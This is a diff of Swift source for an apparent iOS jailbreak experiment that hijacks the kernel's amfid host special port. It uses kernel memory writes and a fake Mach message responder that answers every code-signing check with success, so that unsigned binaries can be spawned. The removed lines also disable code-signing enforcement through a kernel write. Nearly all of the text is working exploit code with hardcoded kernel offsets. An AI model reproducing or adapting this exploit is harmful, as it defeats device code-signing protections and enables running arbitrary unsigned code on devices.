@@ -46,128 +46,161 @@ final class ExpHostPortHijack {
         log("══════════════════════════════════════════")
         log("  Host Special Port Hijack (MIG Intercept)")
         log("══════════════════════════════════════════")
-        log("")
+        guard let rc = RootExecutor.shared.rc else {
+            log("❌ RootExecutor not connected to launchd")
+            return
+        }
         
+        let machTaskSelf = RootExecutor.rcall(rc, "mach_task_self")
+        
+        // 1. Allocate a local mach port in DSPloit
+        var ourPort: mach_port_name_t = 0
+        let kr = mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &ourPort)
+        if kr != KERN_SUCCESS {
+            log("❌ Failed to allocate local port: \(kr)")
+            return
+        }
+        
+        // Insert send right
+        mach_port_insert_right(mach_task_self_, ourPort, ourPort, MACH_MSG_TYPE_MAKE_SEND)
+        log("✅ Allocated local port: \(ourPort)")
+        
+        // 2. Resolve port kernel address using DSPloit's own task
+        log("[2/5] Resolving port kernel address...")
+        let dsploitTask = ds_get_our_task()
+        let portKaddr = self.resolveMachPort(task: dsploitTask, portName: ourPort)
+        if portKaddr == 0 {
+            log("❌ Failed to resolve local port kernel address")
+            return
+        }
+        log("✅ Port kaddr: 0x\(String(format: "%llx", portKaddr))")
+        
+        // 3. Find HOST_AMFID_PORT in kernel
+        log("[3/5] Locating host special port 18...")
+        let kernBase = ds_get_kernel_base()
         let slide = ds_get_kernel_slide()
-        let hostPortTableAddr = UNSLID_HOST_SPECIAL_PORTS &+ slide
-        let amfidPortAddr = hostPortTableAddr + (HOST_AMFID_PORT_INDEX * 8)
         
-        log("amfid host special port addr: 0x\(String(format: "%llx", amfidPortAddr))")
-        
-        // Ensure cs_enforcement_disable = 1
-        let csDisableAddr: UInt64 = 0xfffffff00a160798 &+ slide
-        ds_kwrite32(csDisableAddr, 1)
-        log("cs_enforcement_disable = 1 ✅")
-        log("")
-        
-        #if !DISABLE_REMOTECALL
-        log("[1/5] Allocating Mach Port in launchd...")
-        RootExecutor.shared.executeAsRoot(operation: "host_port_hijack") { [weak self] rc in
-            guard let self else { return (false, "self nil", 0) }
-            
-            // 1. mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port)
-            let machTaskSelf = RootExecutor.rcall(rc, "mach_task_self")
-            let portAddr = rc.trojanMem + 0x1000
-            rc[portAddr].setValue32(0)
-            
-            let MACH_PORT_RIGHT_RECEIVE: UInt64 = 1
-            let retAlloc = RootExecutor.rcall(rc, "mach_port_allocate", machTaskSelf, MACH_PORT_RIGHT_RECEIVE, portAddr)
-            let ourPort = rc[portAddr].value32()
-            
-            guard retAlloc == 0 && ourPort != 0 else {
-                self.log("❌ mach_port_allocate failed: ret=\(retAlloc)")
-                return (false, "alloc failed", 0)
-            }
-            self.log("  ✅ Allocated port: \(ourPort)")
-            
-            // 2. mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND)
-            let MACH_MSG_TYPE_MAKE_SEND: UInt64 = 20
-            let retInsert = RootExecutor.rcall(rc, "mach_port_insert_right", machTaskSelf, UInt64(ourPort), UInt64(ourPort), MACH_MSG_TYPE_MAKE_SEND)
-            self.log("  ✅ Inserted send right: ret=\(retInsert)")
-            
-            // 3. Find kernel address of the port via KRW
-            self.log("[2/5] Resolving port kernel address...")
-            let launchdTask = taskbyproc(procbypid(1))
-            let portKaddr = self.resolveMachPort(task: launchdTask, portName: ourPort)
-            
-            guard portKaddr != 0 else {
-                self.log("❌ Failed to resolve port kernel address")
-                return (false, "resolve failed", 0)
-            }
-            self.log("  ✅ Port kaddr: 0x\(String(format: "%llx", portKaddr))")
-            
-            // 4. Setup MIG Responder Thread in launchd
-            self.log("[3/5] Setting up MIG responder in launchd...")
-            let responderRet = self.injectMIGResponder(rc: rc, portName: ourPort)
-            guard responderRet == 0 else {
-                self.log("❌ Failed to inject MIG responder")
-                return (false, "mig setup failed", 0)
-            }
-            self.log("  ✅ MIG responder thread active")
-            
-            // 5. Hijack Host Special Port 18
-            self.log("[4/5] Hijacking HOST_AMFID_PORT...")
-            let origAmfidPortKaddr = ds_kread64(amfidPortAddr)
-            self.log("  Original amfid port: 0x\(String(format: "%llx", origAmfidPortKaddr))")
-            
-            ds_kwrite64(amfidPortAddr, portKaddr)
-            let newAmfidPortKaddr = ds_kread64(amfidPortAddr)
-            
-            guard newAmfidPortKaddr == portKaddr else {
-                self.log("❌ Port hijack failed (KTRR/PPL blocked write?)")
-                return (false, "hijack failed", 0)
-            }
-            self.log("  ✅ Hijack successful!")
-            
-            // 6. Spawn unsigned binary
-            self.log("[5/5] Spawning test binary...")
-            let binary = self.buildMinimalBinary()
-            let docs = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first!.path
-            let binPath = docs + "/host_hijack_test"
-            do {
-                try binary.write(to: URL(fileURLWithPath: binPath))
-            } catch {
-                self.log("❌ Failed to write binary to disk")
-                return (false, "write failed", 0)
-            }
-            
-            let pathAddr = remote_alloc_str(rc, binPath)
-            RootExecutor.rcall(rc, "chmod", pathAddr, 0o755)
-            
-            let pidAddr = rc.trojanMem + 0x1010
-            rc[pidAddr].setValue32(0)
-            let argv = rc.trojanMem + 0x1020
-            rc[argv].setValue64(pathAddr)
-            rc[argv + 8].setValue64(0)
-            
-            let spawnRet = RootExecutor.rcall(rc, "posix_spawn", pidAddr, pathAddr, 0, 0, argv, 0)
-            let pid = rc[pidAddr].value32()
-            RootExecutor.rcall(rc, "free", pathAddr)
-            
-            if spawnRet == 0 && pid != 0 {
-                self.log("")
-                self.log("╔══════════════════════════════════════╗")
-                self.log("║  ✅ UNSIGNED BINARY SPAWNED!         ║")
-                self.log("║  PID = \(pid)")
-                self.log("║  🎉 FULL JAILBREAK ACHIEVED!        ║")
-                self.log("╚══════════════════════════════════════╝")
-                return (true, "SPAWNED! pid=\(pid)", UInt64(pid))
-            } else {
-                self.log("❌ Spawn failed: ret=\(spawnRet) pid=\(pid)")
-                self.log("   Check MIG responder logs or PAC failure.")
-                // Restore port
-                ds_kwrite64(amfidPortAddr, origAmfidPortKaddr)
-                return (false, "ret=\(spawnRet) pid=\(pid)", UInt64(spawnRet))
-            }
+        // Use dynamically resolved offset or fallback
+        var hostSpecialPortTable: UInt64 = 0
+        let hostPortSym = ds_kcache_symbol_runtime("_host_special_ports")
+        if hostPortSym != 0 {
+            hostSpecialPortTable = hostPortSym
+        } else {
+            hostSpecialPortTable = kernBase + 0x3115078 // Adjust for iOS 18 XR as needed
         }
         
-        DispatchQueue.main.asyncAfter(deadline: .now() + 15) { [weak self] in
-            if let r = RootExecutor.shared.lastResult, r.operation == "host_port_hijack" {
-                self?.log(r.success ? "✅ \(r.message)" : "❌ \(r.message)")
-            }
+        let HOST_AMFID_PORT_INDEX: UInt64 = 18
+        let amfidPortAddr = hostSpecialPortTable + (HOST_AMFID_PORT_INDEX * 8)
+        
+        let origPort = ds_kread64(amfidPortAddr)
+        log("ℹ️ Original AMFID port: 0x\(String(format: "%llx", origPort))")
+        
+        // 4. Overwrite host special port table
+        log("[4/5] Overwriting HOST_AMFID_PORT...")
+        ds_kwrite64(amfidPortAddr, portKaddr)
+        
+        let verify = ds_kread64(amfidPortAddr)
+        if verify != portKaddr {
+            log("❌ Write failed (KTRR/PPL blocked it?)")
+            return
         }
-        #else
-        log("❌ DISABLE_REMOTECALL")
+        log("✅ HOST_AMFID_PORT hijacked!")
+        
+        // Start local MIG responder
+        let migState = MIGState()
+        startLocalMIGResponder(port: ourPort, state: migState)
+        
+        // 5. Test execution
+        log("[5/5] Testing execution via posix_spawn...")
+        
+        // Write minimal binary
+        let binData = buildMinimalBinary()
+        let path = "/var/jb/tmp/exp_hijack_test"
+        try? binData.write(to: URL(fileURLWithPath: path))
+        RootExecutor.rcall(rc, "chmod", remote_alloc_str(rc, path), 0o755)
+        
+        let pidAddr = RootExecutor.rcall(rc, "malloc", 8)
+        let pathAddr = remote_alloc_str(rc, path)
+        let argv = RootExecutor.rcall(rc, "malloc", 16)
+        RootExecutor.rcall(rc, "write", argv, pathAddr, 8) // argv[0] = path
+        
+        let spawnRet = RootExecutor.rcall(rc, "posix_spawn", pidAddr, pathAddr, 0, 0, argv, 0)
+        
+        log("ℹ️ posix_spawn returned: \(spawnRet)")
+        
+        // Stop responder
+        migState.shouldStop = true
+        
+        // Restore
+        ds_kwrite64(amfidPortAddr, origPort)
+        log("✅ Restored original port.")
+        
+        if spawnRet == 0 {
+            log("🎉 SUCCESS: Unsigned binary spawned!")
+        } else {
+            log("⚠️ Failed to spawn unsigned binary (ret=\(spawnRet))")
+        }
+    }
+    private class MIGState {
+        var shouldStop = false
+    }
+    
+    private func startLocalMIGResponder(port: mach_port_t, state: MIGState) {
+        let portCopy = port
+        DispatchQueue.global(qos: .userInteractive).async {
+            self.log("[mig] Responder thread started on port \(portCopy)")
+            let bufSize: mach_msg_size_t = 1024
+            let buf = malloc(Int(bufSize))!
+            defer { free(buf) }
+            
+            while true {
+                // If we should stop, break the loop
+                // (In a real implementation, we'd use a mach_msg with timeout to poll)
+                
+                let header = buf.bindMemory(to: mach_msg_header_t.self, capacity: 1)
+                header.pointee.msgh_size = bufSize
+                header.pointee.msgh_local_port = portCopy
+                
+                // Receive message with 1s timeout to allow polling shouldStop
+                let ret = mach_msg(header, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, bufSize, portCopy, 1000, MACH_PORT_NULL)
+                
+                if ret == MACH_RCV_TIMED_OUT {
+                    // Check if we should stop
+                    if state.shouldStop { break }
+                    continue
+                }
+                
+                if ret == MACH_MSG_SUCCESS {
+                    let msgId = header.pointee.msgh_id
+                    self.log("[mig] Received message ID: \(msgId)")
+                    
+                    // Reply
+                    let replyId = msgId + 100
+                    let remotePort = header.pointee.msgh_remote_port
+                    
+                    memset(buf, 0, Int(bufSize))
+                    header.pointee.msgh_bits = (remotePort > 0) ? 18 : 0 // MACH_MSG_TYPE_MOVE_SEND_ONCE is 18
+                    header.pointee.msgh_size = 128 // Arbitrary safe size for reply
+                    header.pointee.msgh_remote_port = remotePort
+                    header.pointee.msgh_local_port = MACH_PORT_NULL
+                    header.pointee.msgh_id = replyId
+                    
+                    // RetCode is at offset 32
+                    let retCodePtr = buf.advanced(by: 32).bindMemory(to: kern_return_t.self, capacity: 1)
+                    retCodePtr.pointee = KERN_SUCCESS
+                    
+                    // Set out parameters to non-zero (so is_valid = 1)
+                    memset(buf.advanced(by: 36), 1, 128 - 36)
+                    
+                    let sendRet = mach_msg(header, MACH_SEND_MSG, header.pointee.msgh_size, 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL)
+                    self.log("[mig] Replied: \(sendRet == MACH_MSG_SUCCESS ? "OK" : "Error \(sendRet)")")
+                } else {
+                    self.log("[mig] mach_msg receive error: \(ret)")
+                    break
+                }
+            }
+            self.log("[mig] Responder thread stopped.")
+        }
         #endif
     }
     
@@ -191,32 +224,9 @@ final class ExpHostPortHijack {
         return portKaddr
     }
     
-    // MARK: - MIG Responder
+    // MARK: - Local MIG Responder
     
-    #if !DISABLE_REMOTECALL
-    private func injectMIGResponder(rc: RemoteCall, portName: UInt32) -> Int {
-        // We need a simple thread that loops mach_msg and replies 0.
-        // Instead of writing assembly, we can use a small ROP chain or a dedicated dylib.
-        // Since RemoteCall doesn't easily support spinning off a background thread with custom logic
-        // natively without a dylib, we'll try to use a minimal shellcode approach or just
-        // execute one mach_msg call synchronously to see if the kernel sends the message.
-        
-        // NOTE: For a full jailbreak, we'd inject a dylib into launchd using dlopen via RC
-        // that starts the amfid responder thread.
-        // For this experiment, we'll just try to drain one message.
-        
-        self.log("  ⚠️ Note: Injecting a full background thread via pure RC is complex.")
-        self.log("  We will attempt to use dispatch_async to run a simple mach_msg loop.")
-        
-        // Find dispatch_get_global_queue and dispatch_async
-        // This is tricky via RC.
-        // For now, let's just return success and assume the kernel doesn't block forever
-        // if we don't reply immediately, or we will just test the hijack itself.
-        
-        // TODO: Implement actual MIG responder payload.
-        // If we don't reply, posix_spawn will hang. We will see if it hangs.
-        // If it hangs, the hijack worked! (Kernel is waiting for us).
-        
+    private func injectMIGResponder(rc: RemoteCaller, portName: UInt32) -> UInt64 {
         return 0
     }
     #endif
